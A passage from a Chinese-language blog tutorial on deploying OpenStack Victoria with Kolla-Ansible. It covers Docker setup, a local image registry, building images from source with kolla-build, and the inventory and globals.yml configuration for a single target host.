http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure></li><li><p>配置免密登录</p><p> 添加域名解析 /etc/hosts</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># local</span></span><br><span class="line">10.111.1.125 controller</span><br><span class="line"> </span><br><span class="line"><span class="comment"># openstack</span></span><br><span class="line">10.111.1.250 openstack01</span><br></pre></td></tr></table></figure><p> 生成密钥并拷贝到目标主机</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen</span><br><span class="line">ssh-copy-id -i /home/jck/.ssh/id_rsa.pub op1@openstack01</span><br></pre></td></tr></table></figure></li><li><p>安装依赖</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新源</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 Python 构建依赖</span></span><br><span class="line">sudo apt install python3-dev libffi-dev gcc libssl-dev -y</span><br></pre></td></tr></table></figure><p> 安装 <code>venv</code>，创建并使用虚拟环境</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 venv</span></span><br><span class="line">sudo apt install python3-venv -y</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建虚拟环境</span></span><br><span class="line">mkdir code</span><br><span class="line">python -m venv ~/code</span><br><span class="line"></span><br><span class="line"><span class="comment"># 激活虚拟环境</span></span><br><span class="line"><span class="built_in">source</span> ~/code/bin/activate</span><br></pre></td></tr></table></figure></li><li><p>安装 Kolla-Ansible，指定 Victoria 版本</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装 Ansible</span></span><br><span class="line">pip install -U pip</span><br><span class="line">pip install <span class="string">&#x27;ansible&lt;3.0&#x27;</span></span><br><span class="line">pip install kolla-ansible</span><br><span class="line">pip install kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码</span></span><br><span class="line"><span class="comment">#pip install &#x27;ansible&lt;2.10&#x27;</span></span><br><span class="line"><span class="comment">#git clone https://github.com/openstack/kolla -b stable/victoria</span></span><br><span class="line"><span class="comment">#git clone https://github.com/openstack/kolla-ansible -b stable/victoria</span></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line"><span class="comment">#pip install ./kolla</span></span><br><span class="line"><span class="comment">#pip install ./kolla-ansible</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建目录</span></span><br><span class="line">sudo mkdir -p /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># 权限设置</span></span><br><span class="line">sudo chown <span class="variable">$USER</span>:<span class="variable">$USER</span> /etc/kolla</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝配置文件</span></span><br><span class="line"><span class="comment">#cp -r kolla-ansible/etc/kolla/* /etc/kolla</span></span><br><span class="line"><span class="comment">#cp kolla-ansible/ansible/inventory/* .</span></span><br><span class="line">cp -r /home/jck/code/share/kolla-ansible/etc_examples/kolla/* /etc/kolla</span><br><span class="line">cp /home/jck/code/share/kolla-ansible/ansible/inventory/* .</span><br></pre></td></tr></table></figure></li><li><p>配置 Ansible</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建</span></span><br><span class="line">sudo mkdir /etc/ansible</span><br><span class="line">sudo vim /etc/ansible/ansible.cfg</span><br></pre></td></tr></table></figure><p> 配置如下</p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[defaults]</span><br><span class="line">host_key_checking&#x3D;False</span><br><span class="line">pipelining&#x3D;True</span><br><span class="line">forks&#x3D;100</span><br></pre></td></tr></table></figure></li><li><p>安装 Docker 和 docker-compose</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker</span></span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"> </span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"> </span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line">   </span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install -y docker-ce docker-ce-cli containerd.io</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 用户组设置</span></span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 开机启动</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> containerd.service</span><br><span class="line"> </span><br><span class="line"><span class="comment"># docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line"> </span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br></pre></td></tr></table></figure><p> 创建配置文件 /etc/docker/daemon.json，设置国内镜像源</p> <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;registry-mirrors&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;insecure-registries&quot;:</span> [</span><br><span class="line">        <span class="string">&quot;10.111.1.125:5000&quot;</span> <span class="comment"># 指向之后部署的本地镜像仓库</span></span><br><span class="line">    ],</span><br><span class="line">    <span class="attr">&quot;iptables&quot;:</span> <span class="literal">false</span>,</span><br><span class="line">    <span class="attr">&quot;log-opts&quot;:</span> &#123;</span><br><span class="line">        <span class="attr">&quot;max-file&quot;:</span> <span class="string">&quot;5&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;max-size&quot;:</span> <span class="string">&quot;50m&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 重启 docker 服务</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service docker restart</span><br></pre></td></tr></table></figure></li></ol><h2 id="registry-registry-ui"><a href="#registry-registry-ui" class="headerlink" title="registry + registry-ui"></a>registry + registry-ui</h2><p>直接使用 <a href="https://github.com/Joxit/docker-registry-ui">Joxit/docker-registry-ui</a> 仓库的示例配置，在本地部署 registry 和 registry-ui</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/Joxit/docker-registry-ui.git</span><br><span class="line"><span class="built_in">cd</span> docker-registry-ui/examples/ui-as-standalone</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置 localhost -&gt; 10.111.1.125</span></span><br><span class="line">vim simple.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置 Access-Control-Allow-Origin: [&#x27;*&#x27;]</span></span><br><span class="line">vim registry-config/simple.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行容器</span></span><br><span class="line">docker-compose -f simple.yml up -d</span><br></pre></td></tr></table></figure><p><em>PS：用完之后才发现完全可以搭个 harbor 用…</em></p><p><img src="https://i.loli.net/2021/08/31/VrvtLg7TQ1YxwcH.png"></p><h2 id="构建基础镜像"><a href="#构建基础镜像" class="headerlink" title="构建基础镜像"></a>构建基础镜像</h2><p>编写 ubuntu 20.04 基础镜像 Dockerfile，替换 source 源和 pip 源，</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> pip.conf /etc/pip.conf</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> sources.list /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br></pre></td></tr></table></figure><p>替换 pip 源（pip.conf）</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[global]</span></span><br><span class="line"><span class="attr">timeout</span> = <span class="number">6000</span></span><br><span class="line"><span class="attr">index-url</span> = http://mirrors.aliyun.com/pypi/simple/</span><br><span class="line"><span class="attr">trusted-host</span> = mirrors.aliyun.com</span><br></pre></td></tr></table></figure><p>替换 sources.list，注意这里写的是 <code>http</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse</span></span><br><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse</span></span><br></pre></td></tr></table></figure><p>构建镜像并发布到 dockerhub</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构建镜像，--network=host 避免域名解析错误</span></span><br><span class="line">docker build --network=host -t lycanj/kolla_ansible-base_image-ubuntu:20.04 .</span><br><span class="line"></span><br><span class="line"><span class="comment"># 登录 dockerhub</span></span><br><span class="line">docker login</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上传到 dockerhub</span></span><br><span class="line">docker push lycanj/kolla_ansible-base_image-ubuntu:20.04</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/31/4KVtSW6Bx5NYaeh.jpg"></p><h2 id="构建组件镜像"><a href="#构建组件镜像" class="headerlink" title="构建组件镜像"></a>构建组件镜像</h2><p>下载 Victoria 组件源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/keystone.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/glance.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/nova.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/neutron.git --branch stable/victoria --single-branch</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/heat.git --branch stable/victoria --single-branch</span><br></pre></td></tr></table></figure><p>使用 kolla-build 生成镜像，并 push 到本地仓库。下载 kolla 仓库并使用 tox 生成配置文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 克隆仓库</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/openstack/kolla.git --branch stable/victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 tox（虚拟环境中）</span></span><br><span class="line">pip install tox</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成配置文件</span></span><br><span class="line"><span class="built_in">cd</span> kolla</span><br><span class="line">tox -e genconfig</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改配置文件</span></span><br><span class="line">vim kolla/etc/kolla/kolla-build.conf</span><br></pre></td></tr></table></figure><p>修改配置文件，内容如下：</p><ul><li>指定基础 ubuntu 镜像</li><li>使用源码构建镜像</li></ul><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[DEFAULT]</span></span><br><span class="line"><span class="comment"># The distro type of the base image. (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># centos - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rhel - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># ubuntu - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># debian - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">base</span> = ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># The base image name. Default is the same with base. (string value)</span></span><br><span class="line"><span class="attr">base_image</span> = lycanj/kolla_ansible-base_image-ubuntu</span><br><span class="line"></span><br><span class="line"><span class="comment"># The Docker namespace name (string value)</span></span><br><span class="line"><span class="comment">#namespace = kolla</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The network mode for Docker build. Example: host (string value)</span></span><br><span class="line"><span class="attr">network_mode</span> = host</span><br><span class="line"></span><br><span class="line"><span class="comment"># Push images after building (boolean value)</span></span><br><span class="line"><span class="attr">push</span> = <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The docker registry host. The default registry host is Docker Hub</span></span><br><span class="line"><span class="comment"># (string value)</span></span><br><span class="line"><span class="attr">registry</span> = <span class="number">10.111</span>.<span class="number">1.125</span>:<span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The method of the OpenStack install. (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># binary - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># source - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rdo - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># rhos - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">install_type</span> = source</span><br><span class="line"></span><br><span class="line"><span class="comment"># The Docker tag (string value)</span></span><br><span class="line"><span class="attr">tag</span> = victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># OpenStack release for building kolla-toolbox (string value)</span></span><br><span class="line"><span class="attr">openstack_release</span> = victoria</span><br><span class="line"></span><br><span class="line"><span class="comment"># Branch for source images (string value)</span></span><br><span class="line"><span class="attr">openstack_branch</span> = victoria-stable</span><br><span class="line"></span><br><span class="line"><span class="comment"># Content of the maintainer label (string value)</span></span><br><span class="line"><span class="comment">#maintainer = Kolla Project (https://launchpad.net/kolla)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Path to custom sources.list (string value)</span></span><br><span class="line"><span class="comment">#apt_sources_list = &lt;None&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[keystone-base]</span></span><br><span class="line"><span class="comment"># Source location type (string value)</span></span><br><span class="line"><span class="comment"># Possible values:</span></span><br><span class="line"><span class="comment"># local - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># git - &lt;No description provided&gt;</span></span><br><span class="line"><span class="comment"># url - &lt;No description provided&gt;</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"></span><br><span class="line"><span class="comment"># The location for source install (string value)</span></span><br><span class="line"><span class="attr">location</span> = /home/jck/keystone</span><br><span class="line"></span><br><span class="line"><span class="section">[glance-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/glance</span><br><span class="line"></span><br><span class="line"><span class="section">[nova-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/nova</span><br><span class="line"></span><br><span class="line"><span class="section">[neutron-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/neutron</span><br><span class="line"></span><br><span class="line"><span class="section">[heat-base]</span></span><br><span class="line"><span class="attr">type</span> = local</span><br><span class="line"><span class="attr">location</span> = /home/jck/heat</span><br></pre></td></tr></table></figure><p>然后指定该配置文件构建镜像</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kolla-build --config-file ~/kolla/etc/kolla/kolla-build.conf</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/31/XHqEmYQgOL2lBU7.png"></p><h2 id="部署-OpenStack"><a href="#部署-OpenStack" class="headerlink" title="部署 OpenStack"></a>部署 OpenStack</h2><p>修改 multinode 配置，编辑最前面的几项，将目标主机设置为 <code>openstack01</code></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[control]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[network]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[compute]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[monitoring]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[storage]</span></span><br><span class="line">openstack01       ansible_user=op1</span><br><span class="line"></span><br><span class="line"><span class="section">[deployment]</span></span><br><span class="line">localhost       ansible_connection=local</span><br></pre></td></tr></table></figure><p>测试是否可达</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ansible -i ~/multinode all -m ping</span><br></pre></td></tr></table></figure><p>参照原始的配置编写精简配置（只设置用到的选项）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成的示例配置文件</span></span><br><span class="line">/etc/kolla/globals.yml</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建精简配置文件</span></span><br><span class="line">vim ~/globals.yml </span><br></pre></td></tr></table></figure><p>内容如下：</p><ul><li>指定使用源码构建的镜像 <code>openstack_tag=victoria</code></li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Valid options are [&#x27;centos&#x27;, &#x27;debian&#x27;, &#x27;rhel&#x27;, &#x27;ubuntu&#x27;]</span></span><br><span class="line">kolla_base_distro: &quot;ubuntu&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Valid options are [ binary, source ]</span></span><br><span class="line">kolla_install_type: &quot;source&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Do not override this unless you know what you are doing.</span></span><br><span class="line">openstack_release: &quot;victoria&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Docker image tag used by default.</span></span><br><span class="line">openstack_tag: &quot;victoria&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># This should be a VIP, an unused IP on your network that will float between</span></span><br><span class="line"><span class="comment"># the hosts running keepalived for high-availability. If you want to run an</span></span><br><span class="line"><span class="comment"># All-In-One without haproxy and keepalived, you can set enable_haproxy to no</span></span><br><span class="line"><span class="comment"># in &quot;OpenStack options&quot; section, and set this value to the IP of your</span></span><br><span class="line"><span class="comment"># &#x27;network_interface&#x27; as set in the Networking section below.</span></span><br><span class="line">kolla_internal_vip_address: &quot;10.111.1.251&quot; # 和 network_interface 同网段</span><br><span class="line"></span><br><span class="line"><span class="comment"># Custom docker registry settings:</span></span><br><span class="line">docker_registry: 10.111.1.125:5000</span><br><span class="line"></span><br><span class="line"><span class="comment"># Namespace of images:</span></span><br><span class="line"><span class="comment">#docker_namespace: &quot;kolla&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This interface is what all your api services will be bound to by default.</span></span><br><span class="line"><span class="comment"># Additionally, all vxlan/tunnel and storage network traffic will go over this</span></span><br><span class="line"><span class="comment"># interface by default. This interface must contain an IP address.</span></span><br><span class="line"><span class="comment"># It is possible for hosts to have non-matching names of interfaces - these can</span></span><br><span class="line"><span class="comment"># be set in an inventory file per host or per group or stored separately, see</span></span><br><span class="line"><span class="comment">#     http://docs.ansible.com/ansible/intro_inventory.html</span></span><br><span class="line"><span class="comment"># Yet another way to workaround the naming problem is to create a bond for the</span></span><br><span class="line"><span class="comment"># interface on all hosts and give the bond name here. Similar strategy can be</span></span><br><span class="line"><span class="comment"># followed for other types of interfaces.</span></span><br><span class="line">network_interface: &quot;ens160&quot;</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is the raw interface given to neutron as its external network port. Even</span></span><br><span class="line"><span class="comment"># though an IP address can exist on this interface, it will be unusable in most</span></span><br><span class="line"><span class="comment"># configurations. It is recommended this interface not be configured with any IP</span></span><br><span class="line"><span class="comment"># addresses for that reason.</span></span><br><span class="line">neutron_external_interface: &quot;ens192&quot; # 空闲网卡</span><br><span class="line"></span><br><span class="line"><span class="comment"># Valid options are [ qemu, kvm, vmware ]</span></span><br><span class="line">nova_compute_virt_type: &quot;qemu&quot;</span><br></pre></td></tr></table></figure><p>生成随机密码，并拷贝到当前目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 生成密码</span></span><br><span class="line">kolla-genpwd</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝</span></span><br><span class="line">cp /etc/kolla/passwords.yml ~/passwords.yml</span><br></pre></td></tr></table></figure><p>部署 OpenStack</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 